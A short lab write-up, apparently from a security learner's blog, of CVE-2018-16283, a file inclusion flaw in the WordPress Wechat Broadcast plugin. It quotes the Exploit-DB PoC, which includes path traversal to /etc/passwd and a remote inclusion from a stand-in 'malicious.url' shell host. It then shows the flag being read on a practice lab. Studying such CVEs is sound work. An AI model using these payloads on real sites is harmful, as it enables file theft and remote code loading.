---
title: "CVE-2018-16283"
date: 2024-07-24
tags: ["春秋云镜","CVE","WordPress"]
draft: false
---


<https://www.exploit-db.com/exploits/45438>


## WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion

```http
# Exploit Title: WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion
# Author: Manuel Garcia Cardenas
# Date: 2018-09-19
# Software link: https://es.wordpress.org/plugins/wechat-broadcast/
# CVE: CVE-2018-16283

# Description
# This bug was found in the file: /wechat-broadcast/wechat/Image.php
# echo file_get_contents(isset($_GET["url"]) ? $_GET["url"] : '');
# The parameter "url" it is not sanitized allowing include local or remote files
# To exploit the vulnerability only is needed use the version 1.0 of the HTTP protocol 
# to interact with the application.

# PoC
# The following URL have been confirmed that is vulnerable to local and remote file inclusion.

GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd

# Remote File Inclusion POC:

GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=http://malicious.url/shell.txt
```

## 演示

环境: [春秋云镜 免费空间>CVE-2018-16283](https://yunjing.ichunqiu.com/cve/detail/899)

### 1.验证

![](https://static.guyu.pro/yunjing.ichunqiu.com/899/1.webp)

<http://eci-2ze8seqbpqn6bcpaq22a.cloudeci1.ichunqiu.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd>

![](https://static.guyu.pro/yunjing.ichunqiu.com/899/2.webp)

### 2.利用

<http://eci-2ze8seqbpqn6bcpaq22a.cloudeci1.ichunqiu.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../flag> 

![](https://static.guyu.pro/yunjing.ichunqiu.com/899/3.webp)

<http://eci-2ze8seqbpqn6bcpaq22a.cloudeci1.ichunqiu.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=file:///flag> 

![](https://static.guyu.pro/yunjing.ichunqiu.com/899/4.webp)
